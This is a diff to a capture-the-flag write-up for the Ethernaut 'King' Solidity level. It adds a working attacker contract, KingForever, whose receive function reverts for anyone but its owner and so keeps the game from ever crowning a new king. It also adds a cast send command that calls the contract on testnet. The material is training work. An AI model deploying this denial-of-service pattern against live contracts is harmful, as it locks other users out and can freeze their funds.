@@ -1,6 +1,6 @@
 ---
 title: "King"
-tags: []
+tags: ["Receive"]
 reference: https://ethernaut.openzeppelin.com/level/9
 ---
 
@@ -47,6 +47,32 @@ contract King {
 To become king, we have to execute `payable(king).transfer(msg.value)` first. So we may 
 
 (1) let our controlled smart contract become king.
-(2) destory the smart contract so that the `King` contract cannot transfer ether to it.
+(2) require only the king(attacker address) can call the `receive` function of the smart contract so that the `King` contract cannot transfer ether to it.
 
-2. todo
+2. Deploy `KingForever` smart contract
+
+```sol
+contract KingForever {
+    address king;  
+
+    constructor() {
+        king = msg.sender;
+    }
+
+    function beKing(address _kingGame) external payable {
+        _kingGame.call{value: msg.value}("");
+    }
+
+    receive() external payable {
+        king.call{value: address(this).balance}("");
+        require(msg.sender == king);
+    }
+}
+```
+
+3. call `beKing(address)`
+
+```
+cast send 0xEbDE76f16f11e1426972b9dA0AB3E18f240631a8 "beKing(address)" 0xd98558DEEE4ae2B3e6a3d4C0c2384c6aa16BE614 --valu
+e 0.01ether --rpc-url $BASE_SEPOLIA_RPC --private-key
+```
